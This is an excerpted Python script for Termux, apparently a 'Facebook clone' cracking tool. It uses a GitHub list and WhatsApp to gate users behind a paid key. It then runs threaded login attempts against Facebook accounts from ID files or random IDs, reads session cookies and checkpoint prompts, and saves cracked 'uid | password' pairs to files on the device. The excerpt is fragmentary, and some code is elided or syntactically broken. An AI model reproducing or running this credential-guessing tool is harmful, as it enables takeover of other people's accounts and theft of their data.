...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; JANAN \x07')
...
def main_approve():
    ...
    print(logo)
    try:
        key1 = open('//data/data/com.termux/files/home/.Aking.txt', 'r').read()
    except IOError:
        os.system('clear')
        myid = uuid.uuid4().hex[:10]
        kok = open('//data/data/com.termux/files/home/.Aking.txt', 'w')
        kok.write(myid + pro)
        kok.close()
        key1 = open('//data/data/com.termux/files/home/.Aking.txt', 'r').read()
        print(logo)
        ...
        zhid = input("CHOOSE  : ")
        if zhid in ["1", "01"]:
            os.system('xdg-open https://wa.me/+93782832281?text=Hi+Rayees+Amir+I+Approve+My+Ley+Pleas+Approve+Bro++'+key1)

    r1 = requests.get('https://github.com/RayeesAmirNafas01/F.7/blob/main/Approval.txt').text
    if key1 in r1:
        riaz()
    else:
        os.system('clear')
        print( logo)
        print('   ')
        print(" [+] \033[91;1mYOUR KEY : "+key1)
        print('   ')
        print("\x1b[1;97m [+] To One Weckly ")
        print("\x1b[1;97m [+] To 1 Month  ")
        print('   ')
        print('\x1b[1;97m╚════════════════════════════════════════════╝')
        print(' ╔════════════════════════════════════════════╗')
        print('   ')
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/NOOR.txt')
...
def riaz():
    ...
    print(logo)
    print('           \x1b[97m[\033[37;41m  DRAGON HACK   \033[0;m] ')
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  AFGHANISTAN FB CLONE \033[0;m] ")
    print(f" {WHITE}TODAY DATE     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
    print(f" {WHITE}USER NAME      : {BLUE}"+NameX)
    print(f"{BLUE}══════════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}RANDOM CLONE")
    print(f"{RED}[02] {WHITE}FILE CLONING")
    print(f"{RED}[03] {WHITE}FILE CREATE ")
    print (f"{RED}[4] Exit")
    linex()
    NOOR = input("[√] CHOOSE : ")
    if NOOR in ["1","01"]: 
...
def file_crack():
    ...
    linex()
    opt_method = input(f'CHOOSE SERVER {NOOR2} : ')
    os.system('clear')
    print(logo)
...
def passx():
    ...
    print("")
    print(f"{RED}[M1] {WHITE}METHOD {GREEN}[1]")
    print(f"{RED}[M2] {WHITE}METHOD {GREEN}[2]")
    print(f"{RED}[M3] {WHITE}METHOD {GREEN}[3]")
    print(f"{RED}[M4] {WHITE}METHOD {GREEN}[4]")
    print(f"\033[1;91m====================================================")
    noor = input("[√] CHOOSE : ")
    if noor in ["1","01"]:
        pass1()
...
def pass1():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m 🇦🇫 AFGHANISTAN 🇦🇫   \033[0;m]")
    print(f"")
    linex()
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> M1   ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
...
def pass2():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> M2 ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
...
def pass3
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> M3 ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
...
def pass4():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}["+tl+"] ~> M4 ")
        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
        print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "scheme": 'https',
     'accept': '*/*',
    'accept-language': 'fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,fa-AF;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    ...
    'sec-fetch-site': 'same-origin',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/NOOR-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
